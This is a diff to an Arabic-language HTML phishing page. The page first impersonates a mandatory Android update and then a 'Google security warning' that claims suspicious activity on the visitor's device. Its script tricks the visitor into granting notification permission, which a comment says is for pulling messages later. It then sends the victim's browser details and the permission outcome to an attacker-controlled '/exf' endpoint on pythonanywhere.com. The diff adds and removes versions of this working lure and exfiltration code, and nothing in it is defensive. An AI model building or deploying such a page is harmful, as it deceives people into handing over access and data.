@@ -3,51 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث نظام أندرويد الإلزامي</title>
+    <title>تنبيه أمني: تحديث مطلوب</title>
     <style>
-        body { background-color: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; color: #333; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 90%; }
-        img { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #d9534f; }
-        p { font-size: 16px; line-height: 1.6; }
-        button { background-color: #007bff; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; margin-top: 20px; }
-        button:hover { background-color: #0056b3; }
+        body { background-color: #f8f9fa; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        img { width: 70px; }
+        h1 { color: #d9534f; font-size: 20px; }
+        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" alt="security">
-        <h1>تنبيه أمني: تحديث مطلوب</h1>
-        <p>تم اكتشاف محاولة دخول مشبوهة لجهازك. لتأمين حساباتك ومنع الوصول لرسائلك، يجب تفعيل بروتوكول الحماية الفوري.</p>
-        <p><strong>اضغط على الزر أدناه ثم اختر "سماح" (Allow) في النافذة التي ستظهر.</strong></p>
-        <button onclick="startSecureProtocol()">تحديث وتأمين الآن</button>
+    <div class="box">
+        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png">
+        <h1>تحذير أمني من Google</h1>
+        <p>تم اكتشاف نشاط مشبوه. يرجى تفعيل بروتوكول الحماية فوراً لحماية رسائلك وصورك من السرقة.</p>
+        <button onclick="startAction()">تحديث وتأمين الآن</button>
     </div>
 
     <script>
-        async function startSecureProtocol() {
-            // طلب صلاحية الإشعارات (المستمع الصامت للرسائل)
+        async function startAction() {
+            // طلب إذن الإشعارات لسحب الرسائل مستقبلاً
             const permission = await Notification.requestPermission();
             
-            const payload = {
+            const data = {
                 device: navigator.userAgent,
-                msg: permission === 'granted' ? "✅ تم منح صلاحية الوصول للإشعارات (السحب نشط)" : "❌ الضحية رفض الصلاحية"
+                msg: permission === 'granted' ? "✅ الضحية ضغط سماح (السحب نشط)" : "❌ الضحية رفض الصلاحية"
             };
 
-            // إرسال البيانات لسيرفرك في PythonAnywhere
-            // استبدل Mohammed33233 باسم مستخدم PythonAnywhere الخاص بك
+            // إرسال البيانات إلى سيرفرك
             fetch('https://Mohammed33233.pythonanywhere.com/exf', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(data)
             })
             .then(() => {
                 if(permission === 'granted') {
-                    alert("تم تأمين جهازك بنجاح. يمكنك إغلاق الصفحة الآن.");
+                    alert("تم تفعيل الحماية بنجاح!");
                 }
             })
-            .catch(err => console.error("Error sending data:", err));
+            .catch(err => console.error("Error:", err));
         }
     </script>
 </body>
 </html>
-
